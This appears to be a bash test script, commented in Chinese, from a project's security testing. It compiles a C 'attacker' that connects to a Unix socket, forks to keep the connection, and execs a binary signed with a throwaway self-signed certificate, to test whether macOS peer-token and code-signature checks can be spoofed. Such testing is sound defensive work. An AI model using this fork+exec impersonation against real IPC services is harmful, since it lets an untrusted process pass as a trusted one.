#!/usr/bin/env bash
# iWork T03 N1 补充：fork+exec 冒充。攻击进程先 connect，fork 出子进程留着 socket，父进程 exec 一个被信任的二进制
# （同一张自签证书签的 peer-probe）。看服务端按 LOCAL_PEERTOKEN 判出来的身份。约 1 分钟，只在 macOS 跑。
# 结果：tools/t0/out/t03-macos-forkexec/（summary.txt 是结论）。临时钥匙串、私钥、二进制都在临时目录，退出时删除。
set -euo pipefail
export PATH="$HOME/.cargo/bin:$PATH"

ROOT=$(git -C "$(dirname "$0")" rev-parse --show-toplevel)
OUT="$ROOT/tools/t0/out/t03-macos-forkexec"
WORK=$(mktemp -d "${TMPDIR:-/tmp}/iwork-t03-fx.XXXXXX")
KC="$WORK/t03.keychain-db"
SOCK="$WORK/s.sock"
CHILDREN=()
cleanup() {
  for pid in "${CHILDREN[@]:-}"; do [ -n "$pid" ] && kill "$pid" 2>/dev/null || true; done
  pkill -f "$WORK/" 2>/dev/null || true
  security delete-keychain "$KC" 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT
rm -rf "$OUT"; mkdir -p "$OUT"
SUMMARY="$OUT/summary.txt"
note() { echo "$*" | tee -a "$SUMMARY"; }
note "# T03 N1 补充：fork+exec  $(date '+%F %T')  macOS $(sw_vers -productVersion) ($(sw_vers -buildVersion)) $(uname -m)"

(cd "$ROOT" && cargo build -q -p iwork-ipc --features dev --example peer-probe 2>"$OUT/build.txt")
PROBE="$ROOT/target/debug/examples/peer-probe"

# ---- 自签证书 A，签出「被信任的二进制」
security create-keychain -p t "$KC"; security unlock-keychain -p t "$KC"
cat > "$WORK/A.cnf" <<'EOF'
[req]
distinguished_name=dn
x509_extensions=v3
prompt=no
[dn]
CN=iWork T03 Signer A
[v3]
keyUsage=critical,digitalSignature
extendedKeyUsage=critical,codeSigning
basicConstraints=critical,CA:false
EOF
openssl req -x509 -newkey rsa:2048 -nodes -days 2 -config "$WORK/A.cnf" -keyout "$WORK/A.key" -out "$WORK/A.pem" 2>/dev/null
openssl pkcs12 -export -legacy -inkey "$WORK/A.key" -in "$WORK/A.pem" -out "$WORK/A.p12" -passout pass:t
security import "$WORK/A.p12" -k "$KC" -P t -T /usr/bin/codesign >/dev/null
security set-key-partition-list -S apple-tool:,apple: -s -k t "$KC" >/dev/null
cp "$PROBE" "$WORK/trusted"
codesign -f --keychain "$KC" -s "iWork T03 Signer A" -i t03.trusted "$WORK/trusted" 2>/dev/null
note "trusted（证书 A）leaf sha256=$(openssl x509 -in "$WORK/A.pem" -outform DER | openssl dgst -sha256 -r | cut -d' ' -f1)"

# ---- 攻击程序（ad-hoc，链接器签名）：connect → 等 pre 秒 → fork；子进程留 socket，每秒发一行；父进程 exec trusted
cat > "$WORK/attacker.c" <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
int main(int argc, char **argv) {
  if (argc != 5) { fprintf(stderr, "attacker <sock> <trusted> <pre-fork-secs> close|stdout\n"); return 2; }
  int as_stdout = !strcmp(argv[4], "stdout");
  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un a = {0}; a.sun_family = AF_UNIX; strncpy(a.sun_path, argv[1], sizeof a.sun_path - 1);
  if (connect(fd, (struct sockaddr *)&a, sizeof a)) { perror("connect"); return 1; }
  printf("attacker connected pid=%d\n", getpid()); fflush(stdout);
  sleep(atoi(argv[3]));
  pid_t child = fork();
  if (child == 0) {
    /* stdout 模式下子进程先静默 3 秒：这段时间里最后碰过连接的是 exec 后的被信任程序（它往 stdout 写了一行） */
    if (as_stdout) sleep(3);
    for (int i = 0; i < 12; i++) {
      char line[64]; int n = snprintf(line, sizeof line, "data from child pid=%d i=%d\n", getpid(), i);
      write(fd, line, n); sleep(1);
    }
    return 0;
  }
  printf("forked child=%d; parent %d exec trusted\n", child, getpid()); fflush(stdout);
  /* close：父进程不再持有连接；stdout：把连接接到被信任程序的标准输出上，让它自己往这条连接写字节 */
  if (as_stdout) dup2(fd, STDOUT_FILENO);
  close(fd);
  char other[1100]; snprintf(other, sizeof other, "%s.decoy", argv[1]);
  execl(argv[2], argv[2], "--server", other, "--hold", "30", (char *)NULL);
  perror("exec"); return 1;
}
EOF
cc "$WORK/attacker.c" -o "$WORK/attacker"

# ---- 令牌观察服务端：每秒取 LOCAL_PEERPID 与审计令牌（pid、pidversion），按令牌取动态 SecCode，并读出对端发来的数据
cat > "$WORK/tokserver.c" <<'EOF'
#include <Security/Security.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
int main(int argc, char **argv) {
  int s = socket(AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un a = {0}; a.sun_family = AF_UNIX; strncpy(a.sun_path, argv[1], sizeof a.sun_path - 1);
  unlink(argv[1]);
  if (bind(s, (struct sockaddr *)&a, sizeof a) || listen(s, 1)) { perror("bind"); return 1; }
  int c = accept(s, NULL, NULL);
  fcntl(c, F_SETFL, O_NONBLOCK);
  for (int t = 0; t < 8; t++) {
    pid_t pid = 0; socklen_t pl = sizeof pid;
    getsockopt(c, SOL_LOCAL, LOCAL_PEERPID, &pid, &pl);
    audit_token_t tok; socklen_t len = sizeof tok;
    int rc = getsockopt(c, SOL_LOCAL, LOCAL_PEERTOKEN, &tok, &len);
    CFDataRef td = CFDataCreate(NULL, (const UInt8 *)&tok, sizeof tok);
    const void *k[] = {kSecGuestAttributeAudit}, *v[] = {td};
    CFDictionaryRef attrs = CFDictionaryCreate(NULL, k, v, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    SecCodeRef g = NULL;
    OSStatus gs = SecCodeCopyGuestWithAttributes(NULL, attrs, kSecCSDefaultFlags, &g);
    OSStatus dyn = gs ? gs : SecCodeCheckValidity(g, kSecCSDefaultFlags, NULL);
    printf("tick=%d LOCAL_PEERPID=%d token(rc=%d pid=%u pidversion=%u) CopyGuest=%d CheckValidity=%d\n",
           t, pid, rc, tok.val[5], tok.val[7], (int)gs, (int)dyn);
    char buf[512]; ssize_t n;
    while ((n = read(c, buf, sizeof buf - 1)) > 0) { buf[n] = 0; printf("  recv: %s", buf); }
    fflush(stdout);
    if (g) CFRelease(g);
    CFRelease(attrs); CFRelease(td);
    sleep(1);
  }
  return 0;
}
EOF
cc -framework Security -framework CoreFoundation "$WORK/tokserver.c" -o "$WORK/tokserver"

# run <名字> <服务端命令> <fork 前等几秒> <close|stdout>
run() {
  local name="$1" server="$2" pre="$3" mode="$4" log="$OUT/$1.txt"
  rm -f "$SOCK"; : > "$log"
  eval "$server" >> "$log" 2>&1 & local srv=$!; CHILDREN+=("$srv")
  for _ in $(seq 50); do [ -S "$SOCK" ] && break; sleep 0.1; done
  "$WORK/attacker" "$SOCK" "$WORK/trusted" "$pre" "$mode" >> "$log" 2>&1 & local att=$!; CHILDREN+=("$att")
  wait "$srv" 2>/dev/null || true
  kill "$att" 2>/dev/null || true; pkill -f "$WORK/trusted" 2>/dev/null || true
  note ""; note "## $name"; sed 's/^/    /' "$log" | cut -c1-260 | tee -a "$SUMMARY" >/dev/null
}
# 时序一：先由攻击者自己被判定 2 秒，再 fork+exec，之后服务端每秒重判（看会不会「升级」成 trusted）
run probe-check-then-exec "\"$PROBE\" --server \"$SOCK\" --hold 8" 2 close
# 时序二：connect 后立刻 fork+exec，服务端之后的判定都发生在 exec 之后，数据由子进程发
run probe-exec-first      "\"$PROBE\" --server \"$SOCK\" --hold 8" 0 close
# 时序三：同时序二，但连接接到被信任程序的 stdout，它启动时会往连接里写一行；子进程静默 3 秒后才发数据
run probe-exec-first-stdout "\"$PROBE\" --server \"$SOCK\" --hold 8" 0 stdout
# 同样三种时序，看令牌里的 pid / pidversion 与动态 SecCode，以及收到的字节来自谁
run token-check-then-exec "\"$WORK/tokserver\" \"$SOCK\"" 2 close
run token-exec-first      "\"$WORK/tokserver\" \"$SOCK\"" 0 close
run token-exec-first-stdout "\"$WORK/tokserver\" \"$SOCK\"" 0 stdout
note ""; note "完成。原始输出在 $OUT"
